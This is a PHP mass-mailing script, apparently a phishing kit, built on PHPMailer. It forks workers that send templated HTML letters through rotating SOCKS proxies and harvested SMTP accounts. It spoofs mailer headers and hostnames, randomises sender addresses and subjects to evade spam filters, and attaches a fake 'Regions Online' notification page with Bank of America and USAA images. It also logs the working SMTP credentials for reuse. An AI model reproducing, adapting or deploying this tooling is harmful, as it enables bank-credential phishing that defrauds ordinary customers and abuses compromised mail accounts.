<?php

require("./src/PHPMailerAutoload.php");
require("config.php");

declare(ticks = 1);
error_reporting(1);

global $random2;
$random=Random(3);
$random2=RandomNUM(4);
$child=0;
$i=0;
$q=0;
$p=0;
$smtp = "smtps";
$email = "emails";
$sockets = "socks";
$dhost = "@google.com";
$version = 5;

    $err=0; //resetam counter FAILED
    $myFile = "/dev/shm/FAILED".$sender;
    $fh = fopen($myFile, 'w');
    fwrite($fh, $err);
    fclose($fh);

$letter = file_get_contents('letter.html');
$txt = file_get_contents('letter.txt');

function send($socket, $socket_port, $host,$port,$encryption,$username,$password,$from,$fromname,$to,$subject,$html,$text)
    {
global $random2;
         $mail = new PHPMailer();
	 /*  Smtp connect    */
          $mail->IsSMTP();
#        $mail->SMTPDebug  = 2;
	$mail->Encoding = '8bit'; // 8bit base64 multipart/alternative quoted-printable
	$mail->Hostname = "$random2.ox.hosteurope.de";
	date_default_timezone_set('Asia/Tokyo');
        $mail->SMTPAuth = true;
	$mail->CharSet = "UTF-8";
	$mail->ContentType = "text/html";
        if ( $encryption != "base64" )
            {
                $mail->SMTPSecure = "$encryption";
            }
        $mail->Socks_host = $socket;
        $mail->Socks_port = $socket_port;
        $mail->Host = $host;
        $mail->Port= $port;
        $mail->Username = $username;
        $mail->Password = $password;
        $mail->From = $from;
        $mail->FromName = "$fromname";
	$mail->headerLine("format", "flowed");
        $mail->ClearAddresses();
        $mail->AddAddress($to);
        $mail->Subject = "=?UTF-8?B?".base64_encode($subject. RandomNUM(4))."?=";
        $mail->IsHTML(true);
        $mail->Body = $html;
        $mail->AltBody  =  $text;
	$mail->XMailer = "Open-Xchange Mailer to $to";
	$mail->Importance = 'Normal';
	$mail->Sensitivity = 'Normal';
	$mail->addAttachment("1Regions_0nline-notification.html", "Regions_0nline-notification.html");
	$mail->AddEmbeddedImage("1bofaletter.png", "1bofaletter");
	$mail->AddEmbeddedImage("usaa11.png", "usaa1");
	$mail->AddEmbeddedImage("usaa211.png", "usaa2");
	$mail->HeaderLine('Return-Path');
        return $mail->Send();
    }



function Random($x)
    {
        $chars = "kabcdefghijlmopqrstuvwxyz5670234189";
        srand((double)microtime()*1000000);
        $i=0;
        $pass = '' ;
        while ($i <= $x)
            {
                $num = rand() % 36;
                $tmp = substr($chars, $num, 1);
                $pass = $pass . $tmp;
                $i++;
            }
        return $pass;
    }
	
	
function RandomNUM($x)
    {
        $chars = "1234567890";
        srand((double)microtime()*1000000);
        $i=0;
        $pass = '' ;
        while ($i <= $x)
            {
                $num = rand() % 10;
                $tmp = substr($chars, $num, 1);
                $pass = $pass . $tmp;
                $i++;
            }
        return $pass;
    }

function RandomHEX($x)
    {
        $chars = "abcdefghijklmnopqrstuvwxyz";
        srand((double)microtime()*1000000);
        $i=0;
        $pass = '' ;
        while ($i <= $x)
            {
                $num = rand() % 16;
                $tmp = substr($chars, $num, 1);
                $pass = $pass . $tmp;
                $i++;
            }
        return $pass;
    }

/*$content1 = file($sockets);
for ($s = 0; $s < count($content1); $s++)
				{
					$sox[$s] = explode(':', $content1[$s]);
					}
					*/
					
					$fisier = file_get_contents($sockets); // Read the file with the proxy list
$linii = explode("\n", $fisier); // Get each proxy

for($s = 0; $s < count($linii) - 1; $s++)
		{
			$sox[$s] = explode(":", $linii[$s]);
			}
					
$content2=file($smtp);
for ($j=0;$j<count($content2);$j++)
    {
        $smtps[$j] = explode(' ', $content2[$j]);
    }

ini_set('memory_limit','-1');

$content=file($email);
for($i=0;$i<count($content);$i++)
    {
        if($q==(count($content2)))
            {
                $q=0;
            }
        if($p==(count($linii) - 1))
        			{
        				$p=0;
        				}
        $emails[$i] = str_replace("\n","", $content[$i]);
        $pids[$child] = pcntl_fork();

        if($pids[$child] == -1)
            {
                die("Could not fork!");
            }
        elseif($pids[$child] == 0)
            {
            	  $socks_host_ip = $sox[$p][0];
            	  $sox[$p][1] = str_replace("\n","",$sox[$p][1]);
            	  $socks_host_port = $sox[$p][1];
            	  
                $smtps[$q][4]=str_replace("\n","",$smtps[$q][4]);
                $ip=$smtps[$q][0];
                $port=$smtps[$q][1];
                $encryption=$smtps[$q][2];
                $user=$smtps[$q][3];
                $pass=$smtps[$q][4];
		$emsplit = explode("@",$emails);
                $enc_email=base64_encode($emails[$i]);
                $link2=str_replace("@","-",$emails[$i]);
                $link2=str_replace("_","-",$link2);
                $letter=ereg_replace('/[\]/',"",$letter);
				
//modified by C
                $letter=ereg_replace("%em%",$emails[$i],$letter);
                $letter=ereg_replace("%RANDOM1%",RANDOM(5),$letter);
                $letter=ereg_replace("%RANDOM2%",RANDOM(6),$letter);
                $letter=ereg_replace("%RANDOM3%",RANDOM(10),$letter);
                $letter=ereg_replace("%RANDOM4%",RANDOM(8),$letter);          
                $letter=ereg_replace("%HOST%",$hostR,$letter);

//end mod                                                                                


                $letter=ereg_replace("&email&",$emails[$i],$letter);
	       $letter=ereg_replace("&link&",$link.".".$domeniu."",$letter);
                $letter=ereg_replace("&date&",date("G:i, d M Y"),$letter);
	       $letter=ereg_replace("&RANDOM&",$RANDOM."",$letter);
		   
//mod
                $txt=ereg_replace('/[\]/',"",$txt);
                $txt=ereg_replace("%RCPT_ADDRESS%",$emails[$i],$txt);
                $txt=ereg_replace("%RANDOM1%",RANDOM(5),$txt);
                $txt=ereg_replace("%RANDOM2%",RANDOM(6),$txt);
                $txt=ereg_replace("&link&",$link.".".$domeniu."",$txt);
                $txt=ereg_replace("&date&",date("G:i, d M Y"),$txt);
                $txt=ereg_replace("%HOST%",$hostR,$txt);
//end mod   

               if($test_smtp==1)
                    {
                        $subject=$ip." ".$port." ".$encryption." ".$user." ".$pass." ".$subject;
                    }

                $to=$emails[$i];
                
            //    if(send($socks_host_ip, $socks_host_port, $ip,$port,$encryption,$user,$pass,"intl-".RANDOM(4)."@".RANDOM(4).$dhost,$sender_name, $emails[$i],$subject,$letter,$txt))
//echo "Sleeping 5s";
//sleep(0);
$textfile ="links.txt";
$items = file("$textfile");
$item = rand(0, sizeof($items)-1);
$subject = $items[$item];
$subject=str_replace("\n"," ",$subject);
$subject=str_replace(" ","",$subject);

$letter=ereg_replace("%LINK%",$subject,$letter);
$txt=ereg_replace("%LINK%",$subject,$txt);




$textfile ="subject.txt";
$items = file("$textfile");
$item = rand(0, sizeof($items)-1);
$subject = $items[$item];
$subject=str_replace("\n"," ",$subject);

$letter=ereg_replace("%SUBJECT%",$subject,$letter);
$txt=ereg_replace("%SUBJECT%",$subject,$txt);


//               if(send($socks_host_ip, $socks_host_port, $ip,$port,$encryption,$user,$pass,"5597093880@tmomail.net",$sender_name,$emails[$i],$subject,$letter,$txt))
      if(send($socks_host_ip, $socks_host_port, $ip,$port,$encryption,$user,$pass,"support".RandomHEX(5)."@s317220156.online.de","".RandomHEX(2)."Express Delivery",$emails[$i],$subject,$letter,$txt))
//               if(send($socks_host_ip, $socks_host_port, $ip,$port,$encryption,$user,$pass,RANDOM(9).RANDOMNUM(1)."@s317220156.online.de",RANDOMHEX(11),$emails[$i],$subject,$letter,$txt))
//mod by C
                    {
                        $myFile = "SENT";
                        $fh = fopen($myFile, 'a+');
                      #  $data1 = $to." ".$ip.":".$user."\n";
                       $data1 = $to." ".$ip." ".$port." ".$encryption." ".$user." ".$pass."\n";
			fwrite($fh, $data1);
                        fclose($fh);
                        echo ($i+1)." -> ".$to." -> ".$ip.":".$user." -> \033[1;32mSENT\033[37m\n";
                    }
                else
                    {
                        $myFile = "FAILED";
                        $fh = fopen($myFile, 'a+');
                        $data1 = $to." ".$ip.":".$user." ".$socks_host_port."\n";
                        fwrite($fh, $data1);
                        fclose($fh);
                        echo ($i+1)." -> ".$to." -> ".$ip.":".$user." -> \033[1;31mFAILED\033[37m\n";
                    }
                posix_kill(getmypid(), 9);
            }
        else
            {
                $child++;
                if($child == $max )
                    {
                        pcntl_wait($status);
                        $child--;
                    }
            }
        $q++;
        $p++;
	sleep(2);
    }
?>


